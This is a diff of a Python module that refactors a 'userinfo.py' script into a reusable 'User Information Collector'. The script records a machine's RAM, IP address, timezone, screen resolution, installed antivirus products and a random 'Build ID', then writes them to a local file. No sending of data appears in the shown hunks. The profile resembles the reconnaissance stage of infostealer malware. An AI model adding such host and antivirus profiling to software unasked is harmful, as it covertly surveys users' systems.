@@ -1,3 +1,8 @@
+"""
+User Information Collector Module
+Refactored from userinfo.py for better integration
+"""
+
 import os
 import sys
 import platform
@@ -8,9 +13,6 @@ import getpass
 import datetime
 import subprocess
 from pathlib import Path
-
-OUT_FILE = "UserInformation.txt"
-
 import ctypes
 
 def get_total_ram_mb() -> str:
@@ -44,11 +46,13 @@ def get_ip() -> str:
 
 def get_timezone() -> str:
     try:
-        from datetime import datetime
         import tzlocal
         return str(tzlocal.get_localzone())
     except Exception:
-        return datetime.now().astimezone().tzname()
+        try:
+            return datetime.datetime.now().astimezone().tzname() or "Unknown"
+        except Exception:
+            return "Unknown"
 
 def get_resolution() -> str:
     try:
@@ -75,7 +79,8 @@ def get_antivirus() -> str:
     except Exception:
         return "Unknown"
 
-def main():
+def collect_user_info(output_file: str):
+    """Collect user information and save to file"""
     uname = platform.uname()
     info = {
         "Build ID": str(uuid.uuid4())[:8],  # random build ID
@@ -109,11 +114,9 @@ def main():
     lines.append("\nAnti-Viruses: ")
     lines.append(get_antivirus())
 
-    out_path = Path(OUT_FILE)
+    out_path = Path(output_file)
     with open(out_path, "w", encoding="utf-8") as f:
         f.write("\n".join(lines))
 
     print(f"[Done] Wrote {out_path.resolve()}")
-
-if __name__ == "__main__":
-    main()
+    return True
